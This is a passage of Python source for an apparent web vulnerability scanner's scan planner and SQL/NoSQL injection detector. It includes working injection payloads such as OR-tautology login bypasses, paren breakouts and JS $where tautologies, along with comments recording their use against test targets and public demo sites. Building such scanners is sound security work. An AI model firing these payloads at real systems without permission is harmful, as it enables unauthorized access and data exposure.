"""Phase 7: Scan Planner + Phase 8: Detection Framework.
Deterministic, rule-based planner: parameter kind -> candidate vulnerability classes.
Every Detector implements the contract: prepare/mutate/execute/analyze/verify.
"""
from __future__ import annotations
import re, urllib.parse
from html.parser import HTMLParser
from .core import (Endpoint, EventBus, Finding, FindingStatus, ParamKind, Severity,
                   Evidence, Verification, Parameter, ParamLocation, DiscoverySource)
from .http_engine import USER_AGENT, RequestEngine, RequestMutation
from .discovery import (DESTRUCTIVE_GET_RE, STATE_CHANGE_GET_RE,
                        LOGOUT_PATH_RE, endpoint_gate_scope)


def _stable_probe_id(*parts) -> int:
    """Deterministic probe marker in [0, 99991): sha1 over the parts.

    REPRO FIX (2026-10-31, caught by the CI reproducibility gate on its
    first run): this used the BUILTIN hash(), which is PYTHONHASHSEED-
    randomized per process — the same seeded scan produced different
    burhan-missing-<d> evidence text on every execution, moving the
    audit Merkle root and violating the "same seed -> the same root,
    always" contract. sha1 is stable across processes, runs and hosts.
    """
    import hashlib
    return int(hashlib.sha1(
        "|".join(str(p) for p in parts).encode("utf-8")).hexdigest()[:8], 16) % 99991

# OWSP-21b: a param whose VALUE is command-shaped makes the whole endpoint
# unprobeable — the BASE request of any battery executes the command (live:
# 16 do=logout base requests through the authenticated jar on Mutillidae;
# the session survived only because the level-0 app re-authenticates from
# the uid cookie — target luck, not engine correctness), and payload
# mutations on the command param are dead requests (the route's switch
# matches the exact literal — the WrongSecrets OWSP-03 lesson, command flavor).
_COMMAND_SCOPES = (DESTRUCTIVE_GET_RE, STATE_CHANGE_GET_RE, LOGOUT_PATH_RE)


def command_shaped_endpoint(ep) -> bool:
    """True when ANY of the endpoint's params carries a command-shaped
    name=value (do=logout, do=toggle-security, ...) — the canonical ep.url is
    query-stripped, so this MUST look at the Parameters."""
    gs = endpoint_gate_scope(ep)
    return any(rx.search(gs) for rx in _COMMAND_SCOPES)


# ---------------------------------------------------------------- GTP helpers
# GTP-01/GTP-02 (ground-truth push round, live-caught on the OWASP Benchmark):
# two whole input CHANNELS were invisible to every battery:
#   (a) the parameter NAME as the injection channel — apps that resolve the
#       injectable by scanning parameter names for a burhan value
#       (request.getParameterNames() + value.equals(TCID)) take the NAME as
#       user input; mutating VALUES probes a channel the app never reads.
#       Real-world shape: legacy framework routers and reflective resolvers
#       that echo back the submitted field name.
#   (b) parameterless POST surfaces — no discovered param means no battery at
#       all (plan_for iterates ep.parameters). The path's own LAST SEGMENT is
#       a conventional field name on self-named servlet surfaces
#       (/x/BenchmarkTest00037 reads getParameter("BenchmarkTest00037")), and
#       the name=value transposed shape covers the (a) resolver above.
def last_path_segment(url: str) -> str:
    seg = (urllib.parse.urlsplit(url or "").path or "").rstrip("/").split("/")[-1]
    return seg


def _clone_ep_rename_param(ep: Endpoint, old_name: str, new_name: str) -> Endpoint:
    """Shallow endpoint clone with ONE parameter RENAMED (value preserved).

    GTP-01: a name-injection probe must REPLACE the original name, not append
    a second one — resolvers that scan parameter names stop at the FIRST
    matching value, and the original name wins every race if both ride along
    (Tomcat preserves query-string order). The clone carries the payload as
    the param NAME with the original value verbatim; _render() then emits
    exactly one pair, payload-named."""
    import copy as _copy
    ep2 = _copy.copy(ep)
    params = []
    for p in ep.parameters:
        if p.name == old_name:
            p2 = _copy.copy(p)
            p2.name = new_name
            params.append(p2)
        else:
            params.append(p)
    ep2.parameters = params
    return ep2


def _clone_ep_drop_header_params(ep: Endpoint) -> Endpoint:
    """Shallow clone with HEADER-located parameters (and any endpoint-level
    ep.headers) removed — TB-1b (trustbound recall round, live-caught on the
    OWASP Benchmark BenchmarkTest00251): the header-NAME probe's marker must
    be the ONLY non-standard header on the wire, because the family servlet
    takes the NAME of the FIRST header not in its common list. The 00251
    openapi declares a NON-STANDARD header param (in:header name=whatever)
    that renders on every request — riding along, it won the first-non-
    standard race ahead of the marker on every probe (live: the marker-only
    hand probe was LIVE while the engine stayed silent). Auth/session headers
    live on the ENGINE's default_headers (AUTH-05), not on the endpoint, so
    reachability is unaffected."""
    import copy as _copy
    ep2 = _copy.copy(ep)
    ep2.parameters = [p for p in ep.parameters
                      if getattr(p, "location", None) != ParamLocation.HEADER]
    ep2.headers = {}
    return ep2


def _pseudo_param(name: str, value: str, kind) -> Parameter:
    """A synthetic Parameter for name-channel/paramless probes so analyze()
    sees the same object shape value-channel probes do."""
    from .core import ParamLocation
    return Parameter(name=name, value=value, kind=kind,
                     location=ParamLocation.QUERY)


def in_script_or_style(body: str, idx: int) -> bool:
    """DETECT-15 (v4.2.3, live-caught on ginandjuice.shop /catalog?searchTerm):
    is position `idx` of the body inside a <script>...</script> or <style>...</style>
    block? AngularJS does NOT interpolate {{ }} inside script/style element content
    (the $compile service binds rendered text/attribute nodes only), so a canary
    reflected raw inside a script string is NOT an executable Angular context.
    IV14 raw evidence (2026-10-03 20:43 UTC): {{91*7}} marker lands raw in
    `var searchText = '...'` while every breakout probe (', \", </script>, \\') is
    neutralized by the app's escaper — the ng claim was a FALSE POSITIVE. Detectors
    and verifiers must not claim Angular evaluation for script-context reflections."""
    if idx < 0 or idx >= len(body):
        return False
    for m in re.finditer(r"<script\b.*?</script\s*>|<style\b.*?</style\s*>", body, re.S | re.I):
        if m.start() <= idx < m.end():
            return True
    # unclosed-block fallback: more opens than closes before idx = still inside
    opens = len(re.findall(r"<script\b", body[:idx], re.I)) + len(re.findall(r"<style\b", body[:idx], re.I))
    closes = len(re.findall(r"</script\s*>", body[:idx], re.I)) + len(re.findall(r"</style\s*>", body[:idx], re.I))
    return opens > closes


def is_self_callback(hit: dict | None, resp, oast_url: str) -> bool:
    """ENG-08 (live-caught by the v2.5.0 SSRF detector on fixture /vuln/redirect.php):
    the request engine follows SAME-HOST redirects (required for auth landings and
    crawl depth) — an open-redirect target bounces our OAST probe URL back at the
    listener and the ENGINE ITSELF performs the fetch. That callback is scanner-
    initiated, never target-side evidence. Two independent markers: (a) the hop is
    recorded in THIS response's redirect_chain, (b) the fetcher's User-Agent is the
    engine's own. Either marker disqualifies the hit — OOB evidence must come from
    the TARGET's process, not ours."""
    if resp is not None:
        for h in (getattr(resp, "redirect_chain", None) or []):
            loc = h[1] if isinstance(h, (tuple, list)) and len(h) > 1 else str(h)
            if loc == oast_url:
                return True
    h0 = hit[0] if isinstance(hit, list) and hit else (hit if isinstance(hit, dict) else None)
    ua = (h0 or {}).get("ua", "")
    return bool(ua) and ua == USER_AGENT

# ------------------------------------------------------------ Planner rules
# OWSP-09/OWSP-10 (OWASP campaign, live-caught on the OWASP Benchmark — the
# first ground-truth target): command_injection had NO planner rule, so the
# registered, OAST-armed CommandInjectionDetector was unreachable dead code on
# param surfaces (251/251 Benchmark cmdi cases: ZERO candidates; with hindsight
# every prior live campaign's "no cmdi" meant "never probed"). path_traversal
# was planned ONLY for FILENAME-kind params — but params named queryParam (the
# Benchmark's traversal vector) classify SEARCH, and generic string params are
# the common traversal surface in real apps (268/268 pathtraver cases missed).
# command_injection joins GENERIC/SEARCH (the detector is OAST-gated: inert and
# request-free whenever no OAST channel is armed); path_traversal joins
# GENERIC/SEARCH alongside the existing FILENAME rule.
PLANNER_RULES = [
    (ParamKind.NUMERIC,   ["sql_injection"]),
    (ParamKind.IDENTIFIER,["sql_injection", "idor", "header_injection"]),
    (ParamKind.SEARCH,    ["sql_injection", "xss_reflected", "header_injection",
                           "path_traversal", "command_injection"]),
    (ParamKind.URL,       ["open_redirect", "ssrf"]),
    (ParamKind.FILENAME,  ["path_traversal", "command_injection"]),
    (ParamKind.HTML,      ["xss_reflected", "header_injection"]),
    (ParamKind.GENERIC,   ["sql_injection", "xss_reflected", "header_injection",
                           "path_traversal", "command_injection"]),
]

def plan_for(ep: Endpoint) -> list[dict]:
    """Deterministic scan plan: (param, vuln_class) pairs."""
    # OWSP-21b: command-shaped endpoints get NO battery plan at all — the
    # base request executes the command (sibling params ride along verbatim).
    if command_shaped_endpoint(ep):
        return []
    plan = []
    for p in ep.parameters:
        # OWSP-03: submit-button pairs are flow control — the route's params
        # filter demands the exact literal; probing them only produces uniform
        # 405s (live-caught on WrongSecrets: ~1200 wasted requests, half the
        # battery). They ride along verbatim as siblings instead.
        if p.flow_control:
            continue
        # OWSP-18: file inputs are the multipart surface — text payloads are
        # ghost requests (the app reads $_FILES, never the string field)
        if getattr(p, "is_file", False):
            continue
        for kind, classes in PLANNER_RULES:
            if p.kind.value == kind.value:
                for c in classes:
                    plan.append({"endpoint": ep, "param": p, "vuln": c})
                break
    return plan


# ------------------------------------------------------------ Detector contract
class Detector:
    name = "base"
    vuln_type = ""
    severity = Severity.MEDIUM
    timeout_hint: float | None = None

    def __init__(self, engine: RequestEngine, bus: EventBus, strategy_store=None):
        self.engine, self.bus, self.strategies = engine, bus, strategy_store

    def candidates(self, ep: Endpoint) -> list[RequestMutation]:
        raise NotImplementedError

    def analyze(self, m: RequestMutation, resp) -> Finding | None:
        raise NotImplementedError


SQL_ERR_PATTERNS = [
    re.compile(r"Microsoft OLE DB Provider", re.I),
    re.compile(r"\[Microsoft\]\[ODBC", re.I),
    re.compile(r"Unclosed quotation mark", re.I),
    re.compile(r"you have an error in your sql syntax", re.I),
    re.compile(r"sqlite3?\.(OperationalError|ProgrammingError)", re.I),
    re.compile(r"Warning: mysql_", re.I),
    re.compile(r"PostgreSQL.*ERROR", re.I),
    # MAX-03 (maximum internal test, live-caught on Juice Shop 20.2.0): the
    # raw SQLite C-library surface ("SQLITE_ERROR: near ...") — what Node/
    # Sequelize and many drivers put in the 500 body — was NOT in the list.
    # The v4.2.3 VF-04 tightening (DB-error STRING required, bare 5xx no
    # longer counts) was correct, but this signature gap made the verifier
    # reject a genuinely injectable endpoint (status_oracle candidate on
    # /rest/products/search?q=, quote+data -> 500 with SQLITE_ERROR text).
    re.compile(r"SQLITE_(ERROR|CONSTRAINT|MISUSE|RANGE)", re.I),
    re.compile(r"SQLite3?::(SQLException|Exception)", re.I),   # Ruby / PHP bindings
    re.compile(r"ORA-\d{4,5}", re.I),                          # Oracle raw
    re.compile(r"System\.Data\.SqlClient\.SqlException|SqlException\b", re.I),  # .NET
    re.compile(r"PSQLException|ERROR:\s+syntax error at or near", re.I),        # JDBC pg / pg text
    # GTP-11 (ground-truth push round 2, live-caught on the OWASP Benchmark's
    # HSQLDB deployment): the JDBC surface every Java app puts in the 500 body
    # — java.sql.SQLSyntaxErrorException: "unexpected token: 1 in statement
    # [ CALL ' OR '1'='1 ]" — had NO signature. 94/272 sqli FNs on the round-1
    # measurement; the prepareCall/executeQuery family raises exactly this.
    re.compile(r"java\.sql\.SQL\w*(Exception|Error)", re.I),   # JDBC (HSQLDB/MySQL JDBC/DB2)
    re.compile(r"unexpected token:.*in statement", re.I),        # HSQLDB text
    re.compile(r"hsqldb\.jar|org\.hsqldb", re.I),              # HSQLDB stack frames
]

# OWSP-30 (NodeGoat round, live-caught on /allocations/1?threshold=): MongoDB's
# $where sink answers a quote probe with HTTP 500 'MongoError: SyntaxError:
# unexpected token: string literal' (also 'not terminated before end of script'
# live) — a clean DB-error oracle on the most common NoSQL server. These
# signatures identify the ENGINE family: matches route the finding to
# nosql_injection, never sql_injection — a misattributed class is a false
# positive of its own.
MONGO_ERR_PATTERNS = [
    re.compile(r"Mongo(Error|ServerError)", re.I),
    re.compile(r"MongoDB[^\n]{0,80}\b(exception|error)\b", re.I),
    re.compile(r"\$where[^\n]{0,120}\b(SyntaxError|ReferenceError|TypeError)\b", re.I),
]


class SQLiDetector(Detector):
    """Error-based + boolean-blind oracle. Strategies ordered by verified stats (Phase 19)."""
    name, vuln_type = "sqli", "sql_injection"
    severity = Severity.CRITICAL

    STRATEGIES = {
        "quote_error":   ["'", "''"],                      # syntax break -> 500/error string
        "boolean_and":   ["AND 1=1", "AND 1=2"],           # oracle pair
        "error_or":      ["' OR '1'='1"],
    }

    def candidates(self, ep: Endpoint):
        out = []
        for p in ep.parameters:
            # Phase 50 + OWSP-03 + OWSP-18: tokens/flow-controls ride verbatim;
            # file fields are the upload surface — string batteries never touch them
            if p.kind == ParamKind.TOKEN or p.flow_control or getattr(p, "is_file", False):
                continue          # Phase 50: CSRF tokens ride along verbatim, never mutated
            base = p.value if p.value.isdigit() else "1"
            # DETECT-04 (live-caught on ginandjuice.shop /catalog?category=): quote ->
            # HTTP 500 with a GENERIC error page (no SQL keywords anywhere) — the old
            # error-pattern check alone missed it. base + doubled-quote are the paired
            # controls: base must be OK, and a VALID SQL string ('') must be OK too.
            out.append(("base",        RequestMutation(endpoint=ep, param_name=p.name, param_value=base)))
            out.append(("pair_quote",  RequestMutation(endpoint=ep, param_name=p.name, param_value=base + "''")))
            out.append(("quote_error", RequestMutation(endpoint=ep, param_name=p.name, param_value=base + "'")))
            out.append(("boolean_true",  RequestMutation(endpoint=ep, param_name=p.name, param_value=f"{base} AND 1=1")))
            out.append(("boolean_false", RequestMutation(endpoint=ep, param_name=p.name, param_value=f"{base} AND 1=2")))
            # DETECT-01 (live-proven on demo.testfire.net/doLogin): string-context OR-tautology
            # pair with trailing comment — fires on login/auth endpoints where the numeric
            # AND-pair cannot (values quoted as strings in SQL).
            out.append(("or_true",  RequestMutation(endpoint=ep, param_name=p.name, param_value=f"{base}' OR '1'='1' -- ")))
            out.append(("or_false", RequestMutation(endpoint=ep, param_name=p.name, param_value=f"{base}' OR '1'='2' -- ")))
            # DETECT-06 (v4.2.2, live-caught on demo.testfire.net/doLogin 2026-10-03):
            # numeric-tautology OR pair with comment. Target drift neutralized the
            # string-comparison shape ('1'='1') on doLogin while the numeric shape
            # (OR 1=1) still bypassed to /bank/main.jsp — the battery carried ONE
            # SQL shape only, and the engine honestly reported nothing. Same oracle
            # structure (TRUE/FALSE pair, redirect or body-size differential), a
            # second, shape-independent family. Proven live: uid=1' OR 1=1-- ->
            # 302 /bank/main.jsp while uid=1' OR 1=2-- -> 302 login.jsp.
            # OWSP-14 (OWASP campaign, live-caught on DVWA 3.x / MariaDB 11.4):
            # MySQL/MariaDB require WHITESPACE after '--' to open a comment
            # (T-SQL/PostgreSQL accept it bare). The no-space shape made both
            # sides of the pair die as MariaDB syntax errors (identical 634B
            # fatal pages) on the world's most common web DB — the family was
            # calibrated on testfire's MS SQL and never met MySQL. Trailing
            # space keeps T-SQL/pgsql semantics identical.
            out.append(("ornum_true",  RequestMutation(endpoint=ep, param_name=p.name, param_value=f"{base}' OR 1=1-- ")))
            out.append(("ornum_false", RequestMutation(endpoint=ep, param_name=p.name, param_value=f"{base}' OR 1=2-- ")))
            # MAX-09 (maximum internal test, live-caught on Juice Shop 20.2.0
            # /rest/products/search?q=): LIKE-inside-parentheses contexts —
            # WHERE ((name LIKE '%q%' OR description LIKE '%q%')) — break out
            # ONLY with paren-closing shapes: q=1')) OR 1=1-- separates TRUE/FALSE
            # while every flat shape dies as unbalanced parens (HTTP 500) or stays
            # a literal LIKE term (no differential). Apps without paren nesting
            # 500 both variants symmetrically — no differential, no false positive.
            out.append(("par2_true",  RequestMutation(endpoint=ep, param_name=p.name, param_value=f"{base}')) OR 1=1-- ")))
            out.append(("par2_false", RequestMutation(endpoint=ep, param_name=p.name, param_value=f"{base}')) OR 1=2-- ")))
            out.append(("par1_true",  RequestMutation(endpoint=ep, param_name=p.name, param_value=f"{base}') OR 1=1-- ")))
            out.append(("par1_false", RequestMutation(endpoint=ep, param_name=p.name, param_value=f"{base}') OR 1=2-- ")))
            # OWSP-16 (OWASP campaign, live-caught on DVWA /vulnerabilities/sqli_blind/):
            # LOOKUP-style endpoints answer the base-prefixed OR pair identically on
            # both sides (user_id='1' exists under OR 1=1 AND OR 1=2) — the tautology
            # never flips the result. The NO-BASE pair (empty left side) turns the
            # WHERE into a pure tautology: TRUE -> any row exists (200), FALSE -> no
            # rows (apps answer 404 'MISSING' / empty) — a status-flip oracle the
            # base-prefixed families structurally cannot produce. Guards: base must
            # be OK (broken base endpoint = no oracle); a non-SQLi app treats both
            # as literal values -> no flip -> honest silence.
            out.append(("nb_or_true",  RequestMutation(endpoint=ep, param_name=p.name, param_value="' OR '1'='1' -- ")))
            out.append(("nb_or_false", RequestMutation(endpoint=ep, param_name=p.name, param_value="' OR '1'='2' -- ")))
            # OWSP-31 (NodeGoat round, live-caught on /allocations/1?threshold=):
            # JS/NoSQL $where tautology pair — MongoDB's $where evaluates raw
            # JAVASCRIPT (this.userId == 1 && this.stocks > '<payload>'), so every
            # SQL-shaped family dies as an IDENTICAL JS SyntaxError (no differential;
            # live: all OR pairs -> 500 'not terminated before end of script'). The
            # JS-syntax pair separates: `||` tautology matches ALL rows (live: 200,
            # 8251B vs base 7209B), `&&` contradiction matches NONE (live: 500
            # 'no allocations found'). '==' is the JS discriminator — invalid SQL
            # in every engine, so SQL backends answer symmetric errors (honest
            # silence) and the family cannot fire on SQL sinks.
            out.append(("jsor_true",  RequestMutation(endpoint=ep, param_name=p.name, param_value=f"{base}' || '1'=='1")))
            out.append(("jsor_false", RequestMutation(endpoint=ep, param_name=p.name, param_value=f"{base}' && '1'=='2")))
            # SQ-2 (sqli recall round, live-caught on the OWASP Benchmark): the
            # callable-sink control. 27+4 of the 65 sqli FNs sink into a JDBC
            # CallableStatement (`{call <param>}`) where BOTH the quote payload
            # AND the doubled-quote pair control die as SQLSyntaxErrorExceptions
            # (live on BenchmarkTest00008/01302/01712/00996: 1' -> 500 'malformed
            # string', 1'' -> 500 'unexpected token' — '' is NOT valid callable
            # syntax), so both error oracles were structurally dead on the whole
            # family. HSQLDB CALL accepts quote-free VALUE EXPRESSIONS (live:
            # `{call 1-1}` -> 200, `{call 1;}` -> 200), so base-1 is the
            # callable-aware valid-SQL control; the db_error oracle accepts it
            # as an alternative to the '' pair (either clean control proves the
            # surface is not the OWSP-12 always-erroring degenerate). SELECT
            # string contexts answer 200 to base-1 as well ('1-1' is a harmless
            # literal), so the control is safe on every sink family.
            out.append(("call_ctrl", RequestMutation(endpoint=ep, param_name=p.name,
                                                     param_value=f"{base}-1")))
            # GTP-01 (ground-truth push, live-caught on the OWASP Benchmark:
            # 38 of 67 sqli FNs are resolver-shaped: getParameterNames() + a
            # burhan VALUE match — the app interpolates the parameter NAME,
            # so value-channel probes hit a channel the app never reads). The
            # family renames the param to the payload (endpoint clone, value
            # verbatim) so the resolver resolves OUR payload. All probes carry
            # the nminj_ tag so the orchestrator groups them as ONE family
            # (their param names differ by design — a param_name groupby would
            # split the pair and kill the oracle).
            # SQ-1 (sqli recall round, live-caught on the OWASP Benchmark
            # master = v1.2): the family was gated to QUERY params, but the
            # entire benchmark resolver family (38 of the 65 sqli FNs) reads
            # the match from a POST FORM body (requestBody ->
            # application/x-www-form-urlencoded -> ParamLocation.BODY;
            # live-proven on BenchmarkTest00037/00038: body <payload>=<TCID>
            # -> quote-NAMED 500 SQLSyntaxErrorException, pair-NAMED 200,
            # control 200). The gate now admits BODY params with the same
            # non-token/non-flow-control discipline.
            if p.kind != ParamKind.TOKEN and not p.flow_control and p.location in (
                    ParamLocation.QUERY, ParamLocation.BODY):
                _pv = p.value or "1"
                _b = _pv if _pv.isdigit() else "1"
                for tag, payload in (
                        ("nminj_base", None),
                        ("nminj_pair_quote", _b + "''"),
                        ("nminj_quote_error", _b + "'"),
                        ("nminj_or_true",  f"{_b}' OR '1'='1' -- "),
                        ("nminj_or_false", f"{_b}' OR '1'='2' -- "),
                        # SQ-2: the callable-aware control rides the name channel
                        # too — 4 of the resolver FNs sink into {call <name>} where
                        # the '' pair control dies as an unexpected-token error
                        # (live on BenchmarkTest00590/01460: pair-NAMED 500,
                        # base-1-NAMED 200).
                        ("nminj_call_ctrl", _b + "-1")):
                    if payload is None:
                        out.append((tag, RequestMutation(endpoint=ep, param_name=p.name, param_value=_pv,
                                                         note=f"ncgroup:name|{p.name}")))
                    else:
                        epc = _clone_ep_rename_param(ep, p.name, payload)
                        out.append((tag, RequestMutation(endpoint=epc, param_name=payload, param_value=_pv,
                                                         note=f"ncgroup:name|{p.name}")))
        # GTP-02 (ground-truth push, live-caught on the OWASP Benchmark): a
        # paramless surface got NO battery at all — plan_for iterates
        # ep.parameters. Two conventional synthetic shapes, bounded batteries:
        #   seg_*    name=<last path segment>, value=payload — the self-named
        #            servlet convention (getParameter(<segment>)).
        #   segname_* name=payload, value=<segment> — the GTP-01 resolver shape
        #            transposed (the app scans names for the burhan value).
        if not ep.parameters and (ep.method or "GET").upper() in ("POST", "GET"):
            # MAX-10a discipline: the synthetic battery must NEVER open a
            # logout/destructive/command-shaped surface — the probeable gate
            # applies to synthetic params exactly as it does to discovered ones.
            if command_shaped_endpoint(ep):
                return out
            seg = last_path_segment(ep.url)
            if seg and 4 <= len(seg) <= 64:
                nb = "1"          # GTP-02: the numeric base for the synthetic battery
                for tag, nm, val in (
                        ("seg_base", seg, nb),
                        ("seg_pair_quote", seg, nb + "''"),
                        ("seg_quote_error", seg, nb + "'"),
                        ("seg_or_true", seg, f"{nb}' OR '1'='1' -- "),
                        ("seg_or_false", seg, f"{nb}' OR '1'='2' -- ")):
                    out.append((tag, RequestMutation(endpoint=ep, param_name=nm, param_value=val,
                                                     note=f"ncgroup:{seg}|v")))
                for tag, nm, val in (
                        ("segname_base", "burhanbase", seg),
                        ("segname_pair_quote", nb + "''", seg),
                        ("segname_quote_error", nb + "'", seg),
                        ("segname_or_true",  f"{nb}' OR '1'='1' -- ", seg),
                        ("segname_or_false", f"{nb}' OR '1'='2' -- ", seg)):
                    out.append((tag, RequestMutation(endpoint=ep, param_name=nm, param_value=val,
                                                     note=f"ncgroup:{seg}|n")))
        return out

    def analyze(self, pair, resp_map) -> Finding | None:
        """pair = (endpoint, param). resp_map: strategy->Response."""
        ep, p = pair
        ev = []
        # GTP-01/GTP-02: name-channel + paramless-synthetic strategies ride the
        # SAME oracle logic as their value-channel twins — normalize the keys
        # once, remember the channel so the finding (and its verifier replay)
        # can reconstruct the probe shape. The replay needs the ORIGINAL param
        # name (nminj clones renamed it) or the synthetic segment (GTP-02).
        _NC_MAP = {
            "nminj_base": "base", "nminj_pair_quote": "pair_quote",
            "nminj_quote_error": "quote_error", "nminj_or_true": "or_true",
            "nminj_or_false": "or_false", "nminj_call_ctrl": "call_ctrl",
            "seg_base": "base", "seg_pair_quote": "pair_quote",
            "seg_quote_error": "quote_error", "seg_or_true": "or_true",
            "seg_or_false": "or_false",
            "segname_base": "base", "segname_quote_error": "quote_error",
            "segname_or_true": "or_true", "segname_or_false": "or_false",
        }
        _nc_channel = None      # ("name_channel", orig_param) | ("segment_value", seg) | ("segment_name", seg)
        # GTP rule: the channel marker (and its verifier replay shape) applies
        # ONLY to a PURELY name/synthetic group — a resp_map that also carries
        # value-channel twins (an externally-merged map, like a test harness)
        # attributes its oracles to the VALUE channel (the twins win).
        _orig_keys = set(resp_map.keys())
        _VALUE_KEYS = {"base", "pair_quote", "quote_error", "boolean_true",
                       "boolean_false", "or_true", "or_false", "ornum_true",
                       "ornum_false", "par2_true", "par2_false", "par1_true",
                       "par1_false", "nb_or_true", "nb_or_false", "jsor_true",
                       "jsor_false"}
        _pure_nc = not (_orig_keys & _VALUE_KEYS)
        for _k in list(resp_map.keys()):
            if _k in _NC_MAP:
                _nk = _NC_MAP[_k]
                if _nk not in resp_map or resp_map[_nk] is None:
                    resp_map[_nk] = resp_map[_k]
                if _pure_nc:
                    if _k.startswith("nminj"):
                        _nc_channel = ("name_channel", getattr(p, "name", ""))
                    elif _k.startswith("segname"):
                        _nc_channel = ("segment_name", last_path_segment(ep.url))
                    elif _k.startswith("seg"):
                        _nc_channel = ("segment_value", last_path_segment(ep.url))
        # OWSP-27: payload reconstruction for the echo guard (same shapes the
        # battery built — candidates() and analyze() derive base identically).
        from urllib.parse import unquote as _uq
        _base = p.value if (p.value or "").isdigit() else "1"
        def _echo_diff(lt, lf, pt, pf):
            """OWSP-27 (NodeGoat round, live-caught on /learn?url=): payload
            self-echo — the redirect Location CONTAINS the very payload text
            that was submitted, so the TRUE/FALSE 'differential' is behavioral
            ZERO (an open-redirect echo shape: res.redirect(req.query.url)),
            not an auth-bypass oracle. Both sides must echo for the guard to
            suppress (a real oracle echoes neither)."""
            try:
                return (pt in _uq(str(lt or ""))) and (pf in _uq(str(lf or "")))
            except Exception:
                return False
        # OWSP-31: JS-tautology pair ($where/JS-evaluation sinks) — evaluated
        # FIRST because the Mongo db_error control below accepts the JS
        # differential as the pair_quote substitute ('' is a valid SQL string
        # but INVALID JS, so a $where sink fails the doubled-quote control BY
        # DESIGN; base-clean + quote-errors + JS-pair-separates is strictly
        # stronger evidence than a doubled quote).
        jt, jf = resp_map.get("jsor_true"), resp_map.get("jsor_false")
        js_ev = []
        js_oracle = False
        if jt is not None and jf is not None and jt.status and jf.status:
            rbj = resp_map.get("base")
            if rbj is not None and rbj.ok and jt.ok and not jf.ok:
                js_oracle = True
                js_ev.append(Evidence("js_or_differential",
                    f"JS-tautology status flip: base -> {rbj.status}, TRUE ({jt.status}, "
                    f"{len(jt.body or '')}B) vs FALSE ({jf.status}, {len(jf.body or '')}B) "
                    "— $where/JS-evaluation boolean oracle", jt.request_id))
            elif jt.ok and jf.ok and jt.status == jf.status:
                bt, bf = len(jt.body or ""), len(jf.body or "")
                if abs(bt - bf) > max(200, 0.25 * max(bt, bf, 1)):
                    js_oracle = True
                    js_ev.append(Evidence("js_or_differential",
                        f"JS-tautology body differential: TRUE {bt}B vs FALSE {bf}B "
                        "(string-context JS boolean oracle)", jt.request_id))
        mongo_ev = []
        # 1) error-based
        # OWSP-12 (OWASP campaign, live-caught via the Benchmark's ground truth):
        # the error-string match alone fired on surfaces where the server answers
        # 500-with-SQL-error-text REGARDLESS of the payload (missing required
        # input, broken CALL shape) — 26 of 492 verified findings were this
        # degenerate signal (all db_error-only evidence; measured against
        # expectedresults-1.2.csv). The PAIRED CONTROL: the base value must NOT
        # produce the same SQL-error signature — a quote-SPECIFIC error is a
        # real signal; an always-erroring surface is not.
        r = resp_map.get("quote_error")
        rbase = resp_map.get("base")
        # OWSP-13 (OWASP campaign, live-caught on DVWA 3.x / PHP 8.5): the old gate
        # required `not r.ok` — the SQL error had to surface as HTTP 4xx/5xx. PHP
        # applications with display_errors=On print the fatal error INSIDE A 200
        # RESPONSE (DVWA /sqli/?id=1' -> 200 + 'Fatal error: Uncaught
        # mysqli_sql_exception: You have an error in your SQL syntax ... MariaDB
        # server version'), so the world's most common web stack never reached the
        # signature check. The signature must be evaluated REGARDLESS of status;
        # the OWSP-12 degenerate-surface control stays (base must not carry it) and
        # gains the pair_quote control (a VALID SQL string '1''' must not carry it
        # either — an always-erroring surface fails on both).
        if r is not None and r.status:
            def _sig(body: str):
                for p in SQL_ERR_PATTERNS:
                    m2 = p.search(body)
                    if m2:
                        return m2
                return None
            base_pat = _sig(rbase.body or "") if (rbase is not None and rbase.status) else None
            rq2 = resp_map.get("pair_quote")
            pair_pat = _sig(rq2.body or "") if (rq2 is not None and rq2.status) else None
            # SQ-2: the callable-aware control — on CallableStatement sinks the
            # '' pair dies as an unexpected-token SQLSyntaxError just like the
            # bare quote (live: `{call 1''}` -> 500), so pair_pat alone cannot be
            # the degenerate-surface guard there. The quote-free value expression
            # (base-1, live `{call 1-1}` -> 200) is the alternative valid-SQL
            # control: EITHER clean control proves the SQL-error signature is
            # quote-SPECIFIC, not an always-erroring surface (both dirty = the
            # OWSP-12 degenerate stays dead).
            rq3 = resp_map.get("call_ctrl")
            call_pat = _sig(rq3.body or "") if (rq3 is not None and rq3.status) else None
            # a PRESENT, ANSWERED, signature-free call_ctrl counts as the clean
            # control; an ABSENT one (old harness maps, probe unsent/errored)
            # must NOT — the OWSP-13 control-2 suite case live-caught this: a
            # map without call_ctrl and a dirty pair read as "clean control"
            # and the degenerate surface fired.
            _call_clean = rq3 is not None and rq3.status and call_pat is None
            mm = _sig(r.body or "")
            if mm and not base_pat and (not pair_pat or _call_clean):
                ev.append(Evidence("db_error", f"{mm.re.pattern[:40]} matched: {mm.group(0)[:80]}", r.request_id))
            elif (_nc_channel and mm and call_pat is None
                    and rq3 is not None and rq3.ok):
                # SQ-2b (sqli recall round, live-caught on BenchmarkTest00590/
                # 01460 — the resolver+callable overlap): on a callable sink the
                # BASE probe is dirty THROUGH NO FAULT OF THE ATTACKER — the
                # resolver interpolates the ORIGINAL param name ("whatever"),
                # and `{call whatever}` dies as an unknown-procedure
                # SQLSyntaxErrorException (live: 500 'unexpected token'), so
                # base_pat always matches and the family above stays dead. The
                # honest degenerate guard on the NAME channel is the
                # ATTACKER-CONTROLLED valid-SQL control: the base-1 value
                # expression renamed in (live `{call 1-1}` -> 200, the app even
                # prints the evaluated 0). Quote-NAMED carries the SQL-error
                # signature while the attacker's clean expression stays
                # HTTP-OK with no signature = a quote-SPECIFIC error on a
                # channel the attacker controls — the OWSP-12/13 principle
                # with the control the attacker actually steers. SELECT-string
                # resolvers never land here (their base is a harmless literal
                # -> the main branch fires first).
                ev.append(Evidence("db_error",
                    f"{mm.re.pattern[:40]} matched: {mm.group(0)[:80]} "
                    "(name-channel callable: quote-NAMED SQL error while the "
                    "attacker-controlled base-1 expression answers clean)", r.request_id))
            # OWSP-30 (NodeGoat round, live-caught on /allocations/1?threshold=):
            # the Mongo signature family — same paired-control discipline
            # (base must not carry the signature; an always-erroring surface
            # stays dead), except the pair_quote control yields to the JS
            # differential when one is present, because '' is invalid JS.
            def _mongo_sig(body: str):
                for pat in MONGO_ERR_PATTERNS:
                    m2 = pat.search(body)
                    if m2:
                        return m2
                return None
            mo = _mongo_sig(r.body or "")
            mo_base = _mongo_sig(rbase.body or "") if (rbase is not None and rbase.status) else None
            mo_pair = _mongo_sig(rq2.body or "") if (rq2 is not None and rq2.status) else None
            if mo and not mo_base and (not mo_pair or js_oracle):
